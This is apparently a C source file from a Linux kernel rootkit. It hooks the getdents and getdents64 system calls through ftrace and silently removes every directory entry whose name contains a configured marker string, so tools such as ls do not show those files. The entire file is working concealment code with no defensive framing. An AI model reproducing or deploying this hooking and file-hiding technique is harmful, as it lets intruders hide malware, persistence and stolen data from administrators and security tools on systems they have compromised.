#include "config.h"
#include "hook.h"
#include "htm.h"
#include "sys_getdents.h"

#ifdef HTM_PTREGS_SYSCALL_STUBS
static asmlinkage long (*_sys_getdents)(const struct pt_regs *regs);
static asmlinkage long (*_sys_getdents64)(const struct pt_regs *regs);
#else
static asmlinkage long _sys_getdents(unsigned int fd, struct linux_dirent __user * dirent, unsigned int count);
static asmlinkage long _sys_getdents64(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count);
#endif

#ifdef HTM_PTREGS_SYSCALL_STUBS
static notrace asmlinkage long _sys_getdents_hook(const struct pt_regs *regs)
{
	struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
	struct linux_dirent *prv, *cur, *tmp = NULL;

	int ret = _sys_getdents(regs);
#else
static notrace asmlinkage int _sys_getdents_hook(unsigned int fd,
                                                 struct linux_dirent __user * dirent,
                                                 unsigned int count)
{
	struct linux_dirent *prv, *cur, *tmp = NULL;
	int ret = _sys_getdents(fd, dirent, count);
#endif

	long error;
	unsigned long offset = 0;

	if (ret <= 0)
		return ret;

	if (! (tmp = kzalloc(ret, GFP_KERNEL)))
		return ret;

	if ((error = copy_from_user(tmp, dirent, ret)))
		goto _sys_getdents_hook_ret;

	while (offset < ret) {
		cur = (void *)tmp + offset;

		if (strstr(cur->d_name, HTM_FS_STRING)) {
			#ifdef HTM_DEBUG
			htm_pr_info("omitting file/directory: %s", cur->d_name);
			#endif

			// Handle first entries
			if (cur == tmp) {
				ret -= cur->d_reclen;
				memmove(cur, (void *)cur + cur->d_reclen, ret);
				continue;
			}

			prv->d_reclen += cur->d_reclen;
		}
		else
			prv = cur;

		offset += cur->d_reclen;
	}

	error = copy_to_user(dirent, tmp, ret);

	if(error)
		goto _sys_getdents_hook_ret;

_sys_getdents_hook_ret:
	kfree(tmp);
	return ret;
}

#ifdef HTM_PTREGS_SYSCALL_STUBS
static notrace asmlinkage long _sys_getdents64_hook(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	struct linux_dirent64 *prv, *cur, *tmp = NULL;

	int ret = _sys_getdents64(regs);
#else
static notrace asmlinkage int _sys_getdents64_hook(unsigned int fd,
                                                   struct linux_dirent __user * dirent,
                                                   unsigned int count)
{
	struct linux_dirent64 *prv, *cur, *tmp = NULL;
	int ret = _sys_getdents64(fd, dirent, count);
#endif

	long error;
	unsigned long offset = 0;

	if (ret <= 0)
		return ret;

	if (! (tmp = kzalloc(ret, GFP_KERNEL)))
		return ret;

	if ((error = copy_from_user(tmp, dirent, ret)))
		goto _sys_getdents64_hook_ret;

	while (offset < ret) {
		cur = (void *)tmp + offset;

		if (strstr(cur->d_name, HTM_FS_STRING)) {
			#ifdef HTM_DEBUG
			htm_pr_info("omitting file/directory: %s", cur->d_name);
			#endif

			// Handle first entries
			if (cur == tmp) {
				ret -= cur->d_reclen;
				memmove(cur, (void *)cur + cur->d_reclen, ret);
				continue;
			}

			prv->d_reclen += cur->d_reclen;
		}
		else
			prv = cur;

		offset += cur->d_reclen;
	}

	error = copy_to_user(dirent, tmp, ret);

	if(error)
		goto _sys_getdents64_hook_ret;

_sys_getdents64_hook_ret:
	kfree(tmp);
	return ret;
}

struct htm_ftrace_hook hook_sys_getdents = HTM_HOOK("__x64_sys_getdents", _sys_getdents_hook, &_sys_getdents);
struct htm_ftrace_hook hook_sys_getdents64 = HTM_HOOK("__x64_sys_getdents64", _sys_getdents64_hook, &_sys_getdents64);
